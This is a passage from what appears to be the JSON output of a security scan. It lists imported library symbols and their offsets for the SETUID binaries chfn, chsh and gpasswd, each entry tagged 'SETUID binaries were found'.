                        "0x0000eb88",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000eb90",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebc0",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebd0",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebd8",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebe0",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebe8",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ec00",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x000032b0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc58",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc60",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc68",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc70",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc78",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc80",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc88",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc90",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc98",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cca0",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cca8",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccb0",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccb8",
                        "puts",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccc0",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccc8",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccd0",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccd8",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cce0",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cce8",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccf0",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccf8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd00",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd08",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd10",
                        "getpwuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd18",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd20",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd28",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd30",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd38",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd40",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd48",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd50",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd58",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd60",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd68",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd70",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd78",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd80",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd88",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd90",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd98",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cda0",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cda8",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdb0",
                        "setusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdb8",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdc0",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdc8",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdd0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdd8",
                        "getusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cde0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cde8",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdf0",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdf8",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce00",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce08",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce10",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce18",
                        "__memcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce20",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce28",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce30",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce38",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce40",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce48",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce50",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce58",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce60",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce68",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce70",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce78",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce80",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce88",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce90",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce98",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cea0",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cea8",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ceb0",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ceb8",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cec0",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cec8",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ced0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ced8",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cee0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cee8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cef0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cef8",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf00",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf08",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf18",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf20",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf28",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf30",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf38",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf40",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf48",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf50",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf58",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf60",
                        "pam_acct_mgmt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf68",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf70",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf78",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf80",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf88",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf90",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf98",
                        "pam_authenticate",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfa0",
                        "putpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfa8",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfb0",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfb8",
                        "endusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfc0",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d0a0",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d5e8",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d5f0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d620",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d630",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d638",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d640",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d648",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d660",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d510",
                        "setsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d550",
                        "endsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d590",
                        "sgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d740",
                        "fgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d8b0",
                        "getsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d8f0",
                        "getsgnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d930",
                        "putsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014bd8",
                        "__strcat_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014be0",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014be8",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014bf0",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014bf8",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c00",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c08",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c10",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c18",
                        "srandom",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c20",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c28",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c30",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c38",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c40",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c48",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c50",
                        "puts",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c58",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c60",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c68",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c70",
                        "isatty",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c78",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c80",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c88",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c90",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c98",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ca0",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ca8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cb0",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cb8",
                        "stpcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cc0",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cc8",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cd0",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cd8",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ce0",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ce8",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cf0",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cf8",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d00",
                        "setbuf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d08",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d10",
                        "rewind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d18",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d20",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d28",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d30",
                        "gettimeofday",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d38",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d40",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d48",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d50",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d58",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d60",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d68",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d70",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d78",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d80",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d88",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d90",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d98",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014da0",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014da8",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014db0",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014db8",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dc0",
                        "getpwnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dc8",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dd0",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dd8",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014de0",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014de8",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014df0",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014df8",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e00",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e08",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e10",
                        "__stpcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e18",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e20",
                        "l64a",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e28",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e30",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e38",
                        "random",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e40",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e48",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e50",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e58",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e60",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e68",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e70",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e78",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e80",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e88",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e90",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e98",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ea0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ea8",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014eb0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014eb8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ec0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ec8",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ed0",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ed8",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ee0",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ee8",
                        "tcgetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ef0",
                        "tcsetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ef8",
                        "getpass",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f00",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f08",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f10",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f18",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f20",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
